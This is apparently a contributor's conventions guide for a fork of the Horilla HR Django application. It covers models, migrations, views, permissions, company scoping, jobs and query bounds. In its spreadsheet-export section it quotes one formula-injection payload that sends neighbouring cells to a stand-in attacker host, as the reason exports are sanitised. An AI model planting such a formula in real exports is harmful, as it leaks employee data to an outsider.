## Where code goes

Find the owning app first — [`reference/APP_MAP.md`](reference/APP_MAP.md). Then, inside an app:

| File | Holds |
|---|---|
| `models.py` | Models, extending `HorillaModel` |
| `views.py` or `views/` | Function views (HTMX fragments, actions) |
| `cbv/<screen>.py` | Class-based screens built on `horilla_views` generics |
| `forms.py` | `ModelForm` / `Form` subclassing `base.forms` |
| `filters.py` | `HorillaFilterSet` subclasses |
| `urls.py` | Routes; wired into the root urlconf from `apps.py::ready()` |
| `sidebar.py` | Navigation entries |
| `scheduler.py` | `register_job(...)` calls |
| `signals.py` | Signal receivers, imported from `apps.py::ready()` |
| `templates/<app>/` | Templates, namespaced by app |
| `api/` or in `horilla_api/api_urls/<app>/` | DRF serializers, views, routes |
| `tests/` | Django `TestCase` suites |

New behaviour that is Bevy's, not Horilla's, goes in a Bevy app — see
[Extending upstream models](#extending-upstream-models-without-editing-them) and
[`compliance/keep-the-fork-mergeable.md`](compliance/keep-the-fork-mergeable.md).

## Models

Extend `horilla.models.HorillaModel` unless you have a reason not to. It gives you `created_at`,
`created_by`, `modified_by`, `is_active`, `horilla_history` (auditlog), `find()`,
`activate_deactivate()` and the history-sidebar URL.

```python
from django.db import models
from django.utils.translation import gettext_lazy as _

from horilla.models import HorillaModel


class ShiftSwapRequest(HorillaModel):
    employee_id = models.ForeignKey(
        "employee.Employee",
        on_delete=models.CASCADE,
        verbose_name=_("Employee"),
    )
    requested_on = models.DateField(verbose_name=_("Requested On"))

    class Meta:
        verbose_name = _("Shift Swap Request")
        verbose_name_plural = _("Shift Swap Requests")
```

Conventions that matter here:

- **FK fields are named `<thing>_id`** across this codebase (`employee_id`, `leave_type_id`) even
  though they hold model instances. Follow it; templates, filters and exports assume it.
- **`verbose_name` on every field and model**, wrapped in `gettext_lazy`. The generic views and
  exports read verbose names for column headers.
- **Every `CharField` / `TextField` is XSS-checked on save.** `HorillaModel.save()` calls
  `clean_fields()`, which rejects script tags, `javascript:`, inline handlers, active-content tags
  and `file://`. A field that legitimately stores markup opts out with
  `xss_exempt_fields = ["body"]` on the model — and you justify it in the PR.
- Do not restore `full_clean()` in `save()`. The comment in `horilla/models.py` records why the
  narrow `clean_fields()` call is deliberate: code written while validation was off relies on saves
  `full_clean()` would reject.
- Multi-company models get `HorillaCompanyManager` — [Company scoping](#company-scoping).

## Migrations

**A model change ships its migration in the same commit.** This is a hard rule
([`compliance/migrations-are-committed.md`](compliance/migrations-are-committed.md)) because the
staging boot runs `migrate` and nothing else generates migrations.

```powershell
python manage.py makemigrations <app_label>
python manage.py makemigrations --check --dry-run
```

The second command is the gate: it fails when a model change has no migration. `migrate` cannot
detect that — it succeeds against whatever is committed — and `manage.py check` cannot either, so
without this the drift ships silently and surfaces as a runtime column error on someone else's
database.

- Read the generated file before committing. Rename it to something descriptive if the autogenerated
  name is noise.
- Never run `makemigrations` or `migrate` on a server, and never edit a migration that has already
  been applied on staging — add a new one.
- A data migration that touches employee or payroll rows is reversible, or says in its docstring why
  it cannot be.
- Migrations are excluded from `black`, `isort`, `ruff` and the whitespace hooks. Leave them as
  Django generated them.

## Views and URLs

Function views handle actions and HTMX fragments; class-based views handle screens.

```python
# <app>/urls.py
from django.urls import path

from myapp import views
from myapp.cbv import swap_requests

urlpatterns = [
    path("swap-requests/", swap_requests.SwapHomeView.as_view(), name="swap-home"),
    path("swap-requests/list/", swap_requests.SwapListView.as_view(), name="swap-list"),
    path("swap-requests/approve/<int:pk>/", views.approve_swap, name="swap-approve"),
]
```

Then wire the app's `urls.py` into the root urlconf from `apps.py`:

```python
# <app>/apps.py
class MyAppConfig(AppConfig):
    name = "myapp"

    def ready(self):
        from django.urls import include, path
        from horilla.urls import urlpatterns

        from myapp import signals  # noqa: F401  (registers receivers)

        settings.APPS.append("myapp")
        urlpatterns.append(path("myapp/", include("myapp.urls")))
        super().ready()
```

This is how nearly every app is mounted — a route missing from `horilla/urls.py` is in an
`apps.py`. URL **names** are the stable interface: templates and CBVs `reverse()` them, so renaming
one is a breaking change across the app.

## Screens: list, nav, form, detail

A screen is four or five routes composed in the browser, not one view. The canonical small example
is `base/cbv/holidays.py` with its routes in `base/urls.py` — read it before writing a new screen.
The full cookbook, including every class attribute, is [`reference/SCREENS.md`](reference/SCREENS.md).

The shape:

```python
@method_decorator(login_required, name="dispatch")
class SwapListView(HorillaListView):
    model = ShiftSwapRequest
    filter_class = SwapFilter
    columns = [(_("Employee"), "employee_id"), (_("Date"), "requested_on")]
    sortby_mapping = [(_("Date"), "requested_on")]

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.search_url = reverse("swap-list")
        self.view_id = "swapList"
```

- `HorillaListView` is the table, `HorillaNavView` the toolbar above it, `HorillaFormView` the
  create/edit modal, `HorillaDetailedView` the detail modal. Each gets its own URL.
- Permission-dependent toolbar actions are built in `__init__` behind `request.user.has_perm(...)`,
  because the class body is evaluated once at import time and has no request.
- `HorillaFormView` subclasses use `AddOrChangePermissionMixin` with `add_perm` / `change_perm`.
- `form_valid` returns `self.HttpResponse()` to close the modal and let HTMX reload the list.
- Never build a page by hand when a generic covers it —
  [`compliance/screens-use-horilla-views.md`](compliance/screens-use-horilla-views.md).

## Forms and filters

Subclass `base.forms.ModelForm` / `base.forms.Form`, not Django's directly. They apply Horilla's
widget classes (`oh-input`, `oh-select`, `oh-switch__checkbox`), date/time input types and formats,
and reload FK querysets per request.

Filters subclass `horilla.filters.HorillaFilterSet`:

```python
from horilla.filters import HorillaFilterSet


class SwapFilter(HorillaFilterSet):
    class Meta:
        model = ShiftSwapRequest
        fields = ["employee_id", "requested_on"]
```

A FK or M2M field with hundreds of options becomes a server-searched combobox by declaring
`ajax_fields` on the filter class — one dict entry, no new view or URL. The docstring in
`horilla/filters.py::HorillaFilterSet` is the full spec, including the per-request `queryset_fn`
hook you use for company or permission scoping.

## Templates and HTMX

- Templates live in `<app>/templates/<app>/…`; shared generic partials in
  `horilla_views/templates/generic/`.
- The theme and its assets are `horilla_theme`. `horilla_theme/static/cdn/**` is vendored verbatim
  and excluded from line-ending normalisation — do not reformat it.
- Interactions are HTMX attributes on the server-rendered markup. The repeated idiom for opening a
  modal:

  ```html
  hx-get="{% url 'swap-form' %}"
  hx-target="#genericModalBody"
  data-target="#genericModal"
  data-toggle="oh-modal-toggle"
  ```

- A list refreshes by swapping its container (`search_swap_target = "#listContainer"` on the nav
  view). Do not write JavaScript that re-fetches and re-renders a table you could swap.
- Messages raised with `django.contrib.messages` surface through the generic `ReloadMessages` view.
- Custom JavaScript is a last resort. If you add any, it goes in the app's `static/` directory, not
  inline in a template.

## Permissions and decorators

Horilla's decorators are in `horilla/decorators.py`; `horilla_views.cbv_methods` re-exports the ones
CBVs use. The server check comes first, every time
([`compliance/access-control.md`](compliance/access-control.md)).

| Decorator | Use |
|---|---|
| `login_required` | Horilla's own, not Django's — handles HTMX responses and the install/init states |
| `permission_required(perm)` | A single Django permission |
| `any_permission_required([...])` | Any one of several |
| `manager_can_enter(perm)` | The permission **or** being the employee's reporting manager |
| `owner_can_enter(perm, model)` | The permission **or** owning the record |
| `delete_permission()` / `duplicate_permission()` | The generic delete / duplicate routes |
| `superuser_required` | Superusers only |
| `hx_request_required` | Refuses a non-HTMX request to a fragment route |
| `install_required`, `database_init_required` | Setup-state gates |
| `check_integration_enabled(app_name)` | Optional add-on apps (geofencing, face detection, Outlook) |

On a CBV, apply them with `@method_decorator(login_required, name="dispatch")`. For forms, prefer
`AddOrChangePermissionMixin` plus `add_perm` / `change_perm` over hand-rolled checks.

The screen must mirror the server check — a control the user may not use is hidden or disabled with
its reason, never left clickable to fail server-side.

## Company scoping

```python
from base.horilla_company_manager import HorillaCompanyManager


class ShiftSwapRequest(HorillaModel):
    ...
    objects = HorillaCompanyManager(related_company_field="employee_id__employee_work_info__company_id")
```

`HorillaModel` sets `objects = models.Manager()`, so a model you leave alone is **not** scoped.
`python manage.py check --fail-level WARNING --tag horilla.tenancy` flags models that look
company-scoped but are not — run it, it is part of [the gate](../AGENTS.md#checks).

In tests, use `horilla/testkit/company.py::CompanyFilterTestMixin` to set and clear the company
ContextVar rather than mutating model attributes.

API code cannot rely on `CompanyMiddleware` — see [ARCHITECTURE §4](ARCHITECTURE.md#4-multi-company-tenancy).

## Sidebar and menus

```python
# <app>/sidebar.py
MENU = _("Shift Swaps")
IMG_SRC = "images/ui/attendance.svg"

SUBMENUS = [
    {
        "menu": _("My Requests"),
        "redirect": reverse_lazy("swap-home"),
        "accessibility": "myapp.sidebar.my_requests_accessibility",
        "match_prefixes": ["/myapp/swap-requests/detail/"],
    },
]
```

- `accessibility` is a dotted path to a callable that decides visibility per request. Use it instead
  of rendering a link everyone can see and some cannot use.
- `match_prefixes` exists because active-link highlighting is path-based: a sibling URL that is not a
  sub-path of the menu's `redirect` needs its prefix listed, or the wrong item highlights (or two do).
- Settings-page entries register through `horilla/menu/` with the `@register` decorator, collected at
  startup from each app's `menu` module.

## Background jobs

```python
# <app>/scheduler.py
from horilla.scheduling import register_job


def expire_stale_swaps():
    ...


register_job(expire_stale_swaps, "interval", hours=4)
```

- **Never** instantiate `BackgroundScheduler()` yourself. One process runs jobs
  (`manage.py run_scheduler`); registering is declarative and lazy, so importing the module touches
  neither the database nor a thread.
- `job_id` defaults to `<module>.<name>` and is stable across restarts so the APScheduler jobstore
  replaces the row instead of accumulating duplicates. A clashing id raises rather than silently
  collapsing two jobs into one.
- Pass `misfire_grace_time` for a job that must still run after a restart window
  (`attendance/scheduler.py` does).
- A job is idempotent: it will run again after a redeploy, and it may run against a database another
  process is writing.

## Notifications

In-app notifications use `django-notifications` with database storage and the navbar bell tray.
There are no websockets. `notifications/` is vendored and carries upstream's style — it is excluded
from `ruff`. Email and in-app notification rules on record create/update/delete are configured
through `horilla_automations`.

## Settings and environment

`horilla/settings/` is a package: `base.py` (everything), `security.py`, `addons.py` (optional apps
enabled by the presence of credentials), `local_settings.py` (gitignored, optional).

- Read config with `env(...)` from `base.py`'s pattern. Document every new variable in `.env.dist`.
- `base.py` carries a production security gate that raises `ImproperlyConfigured` on insecure
  defaults (`DEBUG=False` with an insecure `SECRET_KEY`, `ALLOWED_HOSTS=*`). CI asserts it fires.
  Do not weaken it.
- `horilla/settings/` is a [protected path](compliance/protected-paths.md): change it only when the
  task names it, and keep the change to the one setting.
- App-level defaults belong in the app, as `<app>/conf.py` with a dict merged from Django settings —
  `workspace_attendance/conf.py` is the pattern.

## Translations

Every user-visible string goes through `gettext_lazy as _`
([`compliance/translatable-ui.md`](compliance/translatable-ui.md)). In templates, `{% translate %}`
/ `{% blocktranslate %}`.

```powershell
make makemessages    # NOT a bare manage.py makemessages
make compilemessages
```

The Makefile target passes `--ignore=static/build/* --ignore=static/images/ionicons/*`. A bare
`makemessages` extracts vendored JavaScript identifiers into the catalogs and produces an enormous
useless diff.

## Queries that stay bounded

Rule: [`compliance/bounded-data-access.md`](compliance/bounded-data-access.md). In practice:

- A list or dashboard view runs the same number of queries for 10 employees and for 500. No ORM call
  inside a loop over employees, attendance rows or candidates — read once with
  `filter(id__in=…)` / `select_related` / `prefetch_related` into a dict keyed by id.
- `select_related` for FKs you render, `prefetch_related` for M2M and reverse sets. A list view
  rendering `employee_id.employee_work_info.department_id` without `select_related` is three queries
  per row.
- Aggregate in SQL (`aggregate`, `annotate`, `Count`, `Sum`), not by looping in Python.
- Paginate. `HorillaListView` does, through `horilla.filters.HorillaPaginator` — do not replace it
  with an unbounded `model.objects.all()` in a template context.
- Exports read in chunks rather than building the whole result set in memory.
- Verify a changed read path with Django's query log or `django-debug-toolbar` locally before the PR.

**Any spreadsheet export goes through `horilla/export_safety.py`.** Excel and LibreOffice evaluate a
cell whose text begins with certain characters, so an employee name or a candidate note carried into
a `.xlsx` can execute on open — `=HYPERLINK("http://attacker/?d="&A1,"x")` exfiltrates neighbouring
cells, and the recipient of an HR export is exactly whose spreadsheet is worth reading. The module
lives outside any one app because there are four separate spreadsheet writers (`report/export.py`,
`horilla_views/cbv_methods.py`, `horilla_views/views.py`, `base/methods.py`) and only one of them
guarded its cells. A new writer uses it rather than growing a fifth copy.

## Logging and observability

- `logger = logging.getLogger(__name__)` at module level. Every log line in a request carries the
  correlation id that `RequestIDMiddleware` sets.
- Scheduler metrics are exposed at `/metrics/` in Prometheus format, staff-only, and additionally
  denied from outside by nginx. `/health/` is a cheap liveness probe that deliberately does **not**
  report the release string; `/ready/` checks database, cache and scheduler.
- Do not log employee personal data, salary figures or tokens.

## Testing

Suites live in `<app>/tests/` and run with `manage.py test <app_label>`. CI runs on PostgreSQL, not
SQLite, because the transaction semantics, JSONField lookups and migration DDL differ. Use
`horilla/testkit/factories.py` (`make_company`, `make_employee`, `make_attendance`,
`make_leave_request`, `make_payslip`, `make_candidate`, …) rather than building fixtures by hand, and
`CompanyFilterTestMixin` for tenancy.

What to test: a calculation (payroll, leave balance, worked hours), an access rule, a correction or
state machine, a tenancy boundary. What not to: template rendering details, or a screen a click-test
covers better. More: [`reference/TESTING.md`](reference/TESTING.md).

## Extending upstream models without editing them

`horilla/inherit/` lets an app contribute a field to another app's model. Registered fields are
routed by `HorillaAutodetector` into the **extending** app's migrations as `InjectField`, not into
the target app's. Use it when Bevy needs a column on an upstream model: the upstream file stays
untouched and an upstream merge does not conflict.

The same package has view-level extension (`view_inherit.py`, `view_registry.py`) for overriding an
upstream view without editing it. Rule:
[`compliance/keep-the-fork-mergeable.md`](compliance/keep-the-fork-mergeable.md).

## Leaving dead code behind

Delete what your change orphans — the replaced helper, the branch it makes unreachable, the imports
it leaves unused, the template nobody renders. That is part of the change, not a drive-by refactor.
`ruff`'s unused-import and unused-variable rules are not enabled yet (`pyproject.toml` records the
backlog), so nothing will catch it for you.
